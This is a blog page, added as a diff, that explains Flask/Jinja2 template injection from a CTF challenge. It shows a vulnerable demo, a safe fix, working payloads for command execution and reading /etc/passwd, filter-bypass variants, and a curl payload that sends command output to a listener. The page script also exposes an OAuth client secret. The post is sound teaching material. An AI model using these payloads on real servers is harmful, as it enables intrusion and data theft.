@@ -1,0 +1,150 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="信息安全研究方向，目前着力于Web安全与渗透测试，向往Open、Free、Share的黑客精神。同时也是一名业余ctf。"><title>浅析Flask SSTI模板注入 | zjun's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = 'https://hm.baidu.com/hm.js?' + '2bd5b990e2605fea321851cd73e77f93';
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+  })();
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">浅析Flask SSTI模板注入</h1><a id="logo" href="/.">zjun's blog</a><p class="description">潜心习安全</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/timeline/"><i class="fa fa-history"> 时间线</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a target="_blank" rel="noopener" href="https://tools.zjun.info/"><i class="fa fa-cube"> Tools</i></a><a target="_blank" rel="noopener" href="https://github.com/z1un"><i class="fa fa-github"> Github</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">浅析Flask SSTI模板注入</h1><div class="post-meta">2020-09-16<span> | </span><span class="category"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%B8%B2%E6%9F%93%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.</span> <span class="toc-text">0x01 渲染模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x02 注入浅析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Bypass"><span class="toc-number">3.</span> <span class="toc-text">0x03 Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="post-content"><p>最近的省赛遇到一个Flask模板注入Bypass的题目，解题过程中很容易得出有过滤<code>_</code>和<code>.</code>两个字符，可惜的是在此之前几乎没有用过Flask框架，导致比赛当时极其尴尬，根本不知道如何绕过，最后队友拿出了Payload，所以赛后自己也较为系统地学习了Flask框架。</p>
+<p>Flask框架是一个轻量化的框架，只要不是用于开发，学习成本还是很低的，很容易理解。</p>
+<h2 id="0x01-渲染模板"><a href="#0x01-渲染模板" class="headerlink" title="0x01 渲染模板"></a>0x01 渲染模板</h2><p>在Flask中渲染有两个函数：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>render_template</code></td>
+<td>用来渲染一个指定的文件</td>
+</tr>
+<tr>
+<td><code>render_template_string</code></td>
+<td>用来渲染一个字符串</td>
+</tr>
+</tbody></table>
+<p>Flask用Jinja2作为渲染引擎，这个渲染引擎就是在html的基础上，在需要数据交互的地方加上标签标注，最后就是将这些标签解析为标准的开发语言语法。web层面的漏洞通常就在于数据交互，开发语言写得不够严谨，容易造成一系列的注入问题。Flask当然也难以避免。</p>
+<h2 id="0x02-注入浅析"><a href="#0x02-注入浅析" class="headerlink" title="0x02 注入浅析"></a>0x02 注入浅析</h2><p>先来看看一段简单的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo</span>():</span></span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;id&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>为了方便本地修改调试，所以开启了<code>debug=True</code>，单从这小段代码就可以看出，传入的<code>id</code>参数直接拼接进了html中，毫无疑问直接拼接html会存在反射型xss，而且这里是Flask框架，可以执行代码，存在RCE。</p>
+<p>这是一种不严谨的写法，安全的写法如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;h3&gt;&#123;&#123; html &#125;&#125;&lt;/h3&gt;&#x27;</span>, html=request.args.get(<span class="string">&#x27;id&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>在用户输入的部分外包裹&#123;&#123; }}，这样就只是一个单纯的传参，不会引起代码执行。</p>
+<p>接着看第一个有安全隐患的代码，直接访问，没有传入参数，显示None。</p>
+<p><img src="https://oss.zjun.info/zjun.info/1FTi6kxIh8wagZj.png" alt="1FTi6kxIh8wagZj"></p>
+<p>传入xss代码，不出所料，直接将其交给了前端执行。</p>
+<p><img src="https://oss.zjun.info/zjun.info/7QGFWizJrbKpX4s.png" alt="7QGFWizJrbKpX4s"></p>
+<p>即然是Jinja2的渲染引擎，那么其中的代码也是能够被解析执行的，因此在判断是否存在模板注入时可以用类似于简单的加减乘除法来判断。</p>
+<p><img src="https://oss.zjun.info/zjun.info/Swz24ajcr9efOKl.png" alt="Swz24ajcr9efOKl"></p>
+<p>本地环境构造了一个rce payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">408</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+<p><img src="https://oss.zjun.info/zjun.info/FtGuAVP3laoILYp.png" alt="FtGuAVP3laoILYp"></p>
+<p>要分析这个Payload，就得先说说Python的魔术方法：</p>
+<table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__class__</code></td>
+<td>返回调用的参数类型</td>
+</tr>
+<tr>
+<td><code>__base__</code></td>
+<td>返回基类</td>
+</tr>
+<tr>
+<td><code>__mro__</code></td>
+<td>允许我们在当前Python环境下追溯继承树</td>
+</tr>
+<tr>
+<td><code>__subclasses__()</code></td>
+<td>返回子类</td>
+</tr>
+</tbody></table>
+<p><img src="https://oss.zjun.info/zjun.info/jQZTWEfXvMJ8IuL.png" alt="jQZTWEfXvMJ8IuL"></p>
+<p>上面打印了从str类到其父类再到其父类的所有子类。</p>
+<p><code>[]</code>、<code>&#123;&#125;</code>、<code>&#39;&#39;</code>、<code>()</code>是Python中的内置变量。通过内置变量的一些属性或函数去访问当前Python环境中的对象继承树，可以从继承树到根对象类。利用<code>__subclasses__()</code>等函数可以再到每一个Object，这样便可以利用当前Python环境执行任意代码。</p>
+<p>当然Python中除了str类还有list、dict、tuple，都可以进行构造，<code>__mro__</code>和<code>__base__</code>都可以返回其基类，但是<code>__base__</code>更加直接一些。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">[].__class__.__base__</span><br></pre></td></tr></table></figure>
+<p>这里就能读取到所有的子类了，然后选择我们所要利用的类，从0开始，这里我用的是<code>&lt;class &#39;subprocess.Popen&#39;&gt;</code>这个类</p>
+<p><img src="https://oss.zjun.info/zjun.info/frc14xjgSCGnHMN.png" alt="frc14xjgSCGnHMN"></p>
+<p>它的位置也好确定，写一个Python遍历打印位置即可找到位置是408</p>
+<p><img src="https://oss.zjun.info/zjun.info/VtqU96fpr4JKjaw.png" alt="VtqU96fpr4JKjaw"></p>
+<p>这里这么多类其实很多都可以利用，选择一个比较熟悉的就行。实在不知道的呢，建议在本地随便打个Payload，丢进burp中爆破位置，比如用命令执行或文件读取的Payload，设置0到600，其实本机一共就472个类，这里设得较大，也不影响。其中可以命令执行的很多，差不多一半左右的都可以。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__base__.__subclasses__()[<span class="number">80</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment"># 命令执行</span></span><br><span class="line">&#123;&#123;&#123;&#125;.__class__.__base__.__subclasses__()[<span class="number">343</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment"># 文件读取</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://oss.zjun.info/zjun.info/sp1MovDLQ2HOSmJ.png" alt="sp1MovDLQ2HOSmJ"></p>
+<p>接着调用OS模块执行系统命令并读取执行结果给变量，再打印到网页。</p>
+<p>下面是某师傅的Payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://oss.zjun.info/zjun.info/OqWJieBfrGhgwzL.png" alt="OqWJieBfrGhgwzL"></p>
+<p>结合我们上面的分析也能很容易看懂这个Payload，相当于调用os执行whoami。</p>
+<h2 id="0x03-Bypass"><a href="#0x03-Bypass" class="headerlink" title="0x03 Bypass"></a>0x03 Bypass</h2><p>本节部分参考<a target="_blank" rel="noopener" href="https://p0sec.net/index.php/archives/120/">Flask/Jinja2模板注入中的一些绕过姿势</a>。</p>
+<p>回到文章开头提到的在省赛遇到的题目，题中有过滤<code>_</code>和<code>.</code>两个字符，只要URL中包含这两个字符就会被拦截。</p>
+<ul>
+<li><strong><code>.</code>被过滤</strong></li>
+</ul>
+<p><code>.</code>被过滤的情况，可以利用<code>[]</code>来包裹函数，替代<code>.</code>的连接效果:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">408</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()</span><br></pre></td></tr></table></figure>
+<p><img src="https://oss.zjun.info/zjun.info/xpaVGBU9f4qRLEO.png" alt="xpaVGBU9f4qRLEO"></p>
+<ul>
+<li><strong><code>_</code>被过滤</strong></li>
+</ul>
+<p>利用Hex编码<code>\x5f</code>替代<code>_</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fbase\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;</span>]()[<span class="number">408</span>][<span class="string">&#x27;\x5f\x5finit\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()</span><br></pre></td></tr></table></figure>
+<p><img src="https://oss.zjun.info/zjun.info/UmVknaRhOirL3pK.png" alt="UmVknaRhOirL3pK"></p>
+<ul>
+<li><strong><code>[</code>被过滤</strong></li>
+</ul>
+<p>利用<code>__getitem__</code>绕过中括号限制：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>)</span><br><span class="line">request.__class__.__mro__.__getitem__(-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>双{被过滤</strong></li>
+</ul>
+<p>利用<code>&#123;% if xxx %&#125;xx&#123;% endif %&#125;</code>绕过：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">408</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;curl http://127.0.0.1:5000/?i=`whoami`&#x27;</span>).read()%&#125;zjun&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+<p>如果可以执行命令，利用curl将执行结果带出来。</p>
+<p><img src="https://oss.zjun.info/zjun.info/EdA74lOaYyfKLTH.png" alt="EdA74lOaYyfKLTH"></p>
+<p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来，可见<a target="_blank" rel="noopener" href="https://p0sec.net/index.php/archives/120/">Flask/Jinja2模板注入中的一些绕过姿势</a>中关于盲注部分脚本。</p>
+<ul>
+<li><strong><code>__</code>被过滤</strong></li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][-1][request.args.subclasses]()[408][request.args.init][request.args.globals][&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals__</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><code>&#39;&#39;</code>被过滤</strong></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">343</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679#toc-11">https://xz.aliyun.com/t/3679#toc-11</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://zgao.top/flask%E4%B9%8Bssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://zgao.top/flask之ssti服务端模版注入漏洞分析</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.0x002.com/2020/2020%E9%87%8D%E5%BA%86%E5%B8%82%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20-%20Web%20Writeup/#flask">https://www.0x002.com/2020/2020重庆市教育系统网络安全攻防竞赛决赛%20-%20Web%20Writeup/#flask</a></p>
+</li>
+</ul>
+</div><div id="donate"><link rel="stylesheet" type="text/css" href="/css/donate.css"><script type="text/javascript" src="/js/donate.js" successtext="复制成功!"></script><a class="pos-f tr3" id="github" target="_blank" rel="noopener" href="https://github.com/z1un" arget="_blank" title="Github"></a><div id="DonateText">Donate</div><ul class="list pos-f" id="donateBox"><li id="AliPay" qr="/img/AliPayQR.png"></li><li id="WeChat" qr="/img/WeChatQR.png"></li></ul><div class="pos-f left-100" id="QRBox"><div id="MainBox"></div></div></div><div class="post-copyright"><script type="text/javascript" src="/js/copyright.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copyright.css"><p><span>本文标题：</span>浅析Flask SSTI模板注入</p><p><span>文章作者：</span>zjun</p><p><span>发布时间：</span>2020-09-16</p><!--p--><!--    span= __('copyright_update_prefix')--><!--    = page.updated.format(config.date_format)--><p><span>原始链接：</span><a href="/2020/analysis-of-flask-ssti-template-injection.html">https://blog.zjun.info/2020/analysis-of-flask-ssti-template-injection.html</a><span class="copy-path"><i class="fa fa-clipboard" data-clipboard-text="https://blog.zjun.info/2020/analysis-of-flask-ssti-template-injection.html"></i></span></p><p><span>版权声明：</span>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！</p></div><br><script type="text/javascript" src="/js/share.js?v=1.0.0" async></script><a class="article-share-link" data-url="https://blog.zjun.info/2020/analysis-of-flask-ssti-template-injection.html" data-id="ckl94f9u10008awryf2zff3fr" data-qrcode="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACtElEQVR42u3awY4aQQwE0P3/nybXSMBQZU+TjfTmtCLA9OtIY1Ptn5/4ejxdz6///cq7T83e//zOmy88PDy89dITxrtvuH7/u1fe3Tf5/uvP4uHh4Z3jvVv09d8tvi0tyXo+WPDw8PB+Aa8F5MUjuQseHh7e/8i7bpQ/NLjxfZPYAg8PD+/f8toINQEkhWHWsh/JWvDw8PBiXr643/P3kfM9PDw8vPWpevLAbRvfttV+LC48PDy8E7z8gTsbn9oEuLOhKzw8PLzv8PLH8ab5ziPg64XekFXj4eHhrXn7cdV2L2fbN4yS8fDw8G7lJQNSOTI5ptpvbn53PDw8vNO82RDAXQMBszi4XigeHh7emrc/0NqUk/zb8sJTN9l4eHh4Ja/9eT+LWZPm+HrvZ1EFHh4e3mleHknkAWu79LtiiBeFAQ8PD+8rvFmrnReP2ehVEXng4eHhHeB9/4C/3aZZslL/esDDw8OLebMDp2S3kpLQNs1ts46Hh4d3gpd8YBZDbCLaWRtd/B/i4eHh3cTLH82bcYF2EzelAg8PD+8Eb/aDv71lHg23BebDTwI8PDy8A7z2OGoWVeRHaO1KosEsPDw8vAO8WTTQDma1yLsKDB4eHt4JXhslzB7rm0GE1dAVHh4e3gHepoHeRBKzInHDKR8eHh7emtc2srPhgLvCiLrA4OHh4R3jRVMGi0f/JtRoqS8KAx4eHt4xXhI3zIYM9nFtG4vg4eHhneA9yqsdO5iNVSVHcdG/4uHh4R3gtQ/fdgvyKDYvTm1bj4eHh3eCd1dz3IYa7Rldu5V4eHh4p3ntEECOzAvGPox48QoeHh7er+ElD/18VGtTTo4UBjw8PLzDPWcyKNAWj00IgoeHh/cdXr649gHdHk1touFV1oKHh4c3//5hQ9wuoqW27T4eHh7eAd4fEqzkKX3MHyAAAAAASUVORK5CYII=">分享</a><div class="tags"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a><a href="/tags/flask/"><i class="fa fa-tag"></i>flask</a><a href="/tags/ssti/"><i class="fa fa-tag"></i>ssti</a></div><div class="post-nav"><a class="pre" href="/2020/z1-aggressorscripts.html">最近写的一款Cobalt Strike插件</a><a class="next" href="/2020/neovim-configuration-file-in-a-fast-scripting-scenario.html">快速脚本编写场景下的neovim配置文件</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=1.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=1.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=1.0.0"></script><script>var gitalk = new Gitalk({
+  clientID: 'a29c90b69a24ed5a320d',
+  clientSecret: '62b4bde8f0a28a1a782e49c56380cb10d365cd87',
+  repo: 'gitalk',
+  owner: 'z1un',
+  admin: ['z1un'],
+  id: md5(location.pathname),
+  distractionFreeMode: false
+})
+gitalk.render('container')
+</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Other/">Other</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/attacking-jwt-authentication.html">JWT鉴权攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/about-the-online-tools-site.html">关于在线工具站点</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/z1-aggressorscripts.html">最近写的一款Cobalt Strike插件</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/analysis-of-flask-ssti-template-injection.html">浅析Flask SSTI模板注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/neovim-configuration-file-in-a-fast-scripting-scenario.html">快速脚本编写场景下的neovim配置文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/kerberos-protocol-to-ticket-forgery.html">Kerberos协议到票据伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/ntlm-authentication-to-pth-attack.html">NTLM认证协议到Pass The Hash攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/ciscn-2020-preliminaries.html">CISCN 2020 线上初赛部分WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/from-windows-local-authentication-to-obtaining-hash.html">由Windows本地认证到Hash抓取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/talking-about-intranet-penetration-agent.html">浅谈内网渗透代理</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.w3bsafe.cn/" title="w3bsafe安全团队" target="_blank">w3bsafe安全团队</a><ul></ul><a href="http://www.c-hasel.cn/" title="Corey" target="_blank">Corey</a><ul></ul><a href="http://www.snow404.cn/" title="snow" target="_blank">snow</a><ul></ul><a href="http://www.hackxc.cc/" title="小陈" target="_blank">小陈</a><ul></ul><a href="https://0x20h.com/" title="Sp4ce" target="_blank">Sp4ce</a><ul></ul><a href="https://blog.cdusec.com/" title="成都大学信息安全内部博客" target="_blank">成都大学信息安全内部博客</a><ul></ul><a href="https://dna049.com/" title="dna049" target="_blank">dna049</a><ul></ul><a href="https://jokerm.com/" title="JokerM's Palace" target="_blank">JokerM's Palace</a><ul></ul><a href="https://superj.site/" title="Opt1mus" target="_blank">Opt1mus</a><ul></ul><a href="https://zgao.top/" title="zgao" target="_blank">zgao</a><ul></ul><a href="https://blog.happysec.cn/" title="小北" target="_blank">小北</a><ul></ul><a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><!--#footer= 'Copyright © ' + date(Date.now(), 'YYYY') + ' '--><!--  a(href=url_for('.'), rel='nofollow')= config.title + '.'--><!--  |  Powered by--><!--  a(rel='nofollow', target='_blank', href='https://hexo.io')  Hexo.--><!--  a(rel='nofollow', target='_blank', href='https://github.com/tufu9441/maupassant-hexo')  Theme--><!--  |  by--><!--  a(rel='nofollow', target='_blank', href='https://github.com/pagecho')  Cho.--><div id="footer">Copyright © 2021 <a rel="nofollow" target="_blank" href="https://www.zjun.info"> ZJUN |</a><a rel="nofollow" target="_blank" 